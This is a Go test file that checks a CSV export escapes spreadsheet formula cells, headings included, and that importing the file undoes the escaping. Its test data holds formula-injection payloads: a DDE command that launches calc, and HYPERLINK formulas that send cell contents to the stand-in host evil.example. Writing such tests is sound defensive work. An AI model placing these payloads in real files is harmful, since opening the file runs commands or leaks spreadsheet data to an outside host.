// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: Apache-2.0

package sheet

import (
	"encoding/csv"
	"strings"
	"testing"

	"github.com/quilzo/quilzo/internal/collection"
)

// guardSamples are cells a spreadsheet would run, or not, as Quilzo's
// exports have to treat them: the plain decimal numbers left alone, and
// everything else that begins = + - @ a tab or a carriage return guarded.
var (
	plainNumbers = []string{"-4", "+3", "-4.5", "-0.25", "-.5", "+0", "-12."}
	formulaCells = []string{"=1+1", "@SUM(A1)", "+", "-", "\t=1", "\tplain", "\r=1",
		"-2+3+cmd|' /C calc'!A0", "=HYPERLINK(\"http://evil.example/\"&A1)",
		"-Inf", "+Inf", "-0x1p3", "-1e5", "+1_000", "-4,5", "- 4", "+44 20 7946 0000"}
)

// Only a plain decimal number escapes the guard.
//
// The records export let through anything strconv.ParseFloat reads, which
// is more than numbers a person writes: -Inf, -0x1p3 and -1e5 went out
// unguarded, and a spreadsheet reads each as the start of a formula. The
// guard is about what a spreadsheet runs, so its exemption is what a
// spreadsheet reads as a number and nothing Go happens to parse.
func TestOnlyAPlainDecimalNumberEscapesTheGuard(t *testing.T) {
	cells := func(values []string) []string {
		var recs []collection.Record
		for i, v := range values {
			recs = append(recs, collection.Record{ID: string(rune('a' + i)), Created: int64(i),
				Fields: map[string]any{"note": v}})
		}
		rows, err := csv.NewReader(strings.NewReader(string(Write(nil, recs, WriteOptions{})))).ReadAll()
		if err != nil {
			t.Fatal(err)
		}
		var out []string
		for _, r := range rows[1:] {
			out = append(out, r[1])
		}
		return out
	}
	for i, got := range cells(plainNumbers) {
		if got != plainNumbers[i] {
			t.Errorf("the number %q was written as %q", plainNumbers[i], got)
		}
	}
	for i, got := range cells(formulaCells) {
		// encoding/csv drops a lone carriage return from a file whose lines
		// it ends with one, so the guarded cell shows without it.
		if want := strings.ReplaceAll("'"+formulaCells[i], "\r", ""); got != want {
			t.Errorf("%q was written as %q, which a spreadsheet runs", formulaCells[i], got)
		}
	}
	for _, v := range plainNumbers {
		if IsFormula(v) || GuardCell(v) != v {
			t.Errorf("the number %q is guarded", v)
		}
	}
	for _, v := range formulaCells {
		if !IsFormula(v) || GuardCell(v) != "'"+v {
			t.Errorf("%q is not guarded", v)
		}
	}
}

// What an export guards, reading takes back, so a file written here comes
// back in as it went out.
func TestWhatAnExportGuardsAnImportTakesBack(t *testing.T) {
	for _, v := range append(append([]string{"plain", "", "'quoted"}, plainNumbers...), formulaCells...) {
		if got := UnguardCell(GuardCell(v)); got != v {
			t.Errorf("%q was guarded and read back as %q", v, got)
		}
	}
}

// A heading is a cell too, and is guarded as one.
//
// A collection bound to no type takes a record with any field name, from
// the command line, the browser, the content API or a model over MCP, and
// the records export writes each name a record has as a heading. Every
// value went through the guard and the headings did not, so a field named
// =HYPERLINK("http://evil.example/?"&B2) was a formula in the file the
// owner opened. A field name that is a word, which is every one a type can
// declare, is written as it was.
func TestTheHeadingsOfARecordsExportAreGuardedToo(t *testing.T) {
	formula := `=HYPERLINK("http://evil.example/?"&B2)`
	recs := []collection.Record{{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", formula: "x"}}}
	rows, err := csv.NewReader(strings.NewReader(string(Write(nil, recs, WriteOptions{})))).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(rows[0], ","); got != "id,name,'"+formula {
		t.Errorf("the headings were written as %q", got)
	}
	for _, h := range rows[0] {
		if IsFormula(h) {
			t.Errorf("the heading %q is a formula to a spreadsheet", h)
		}
	}
}
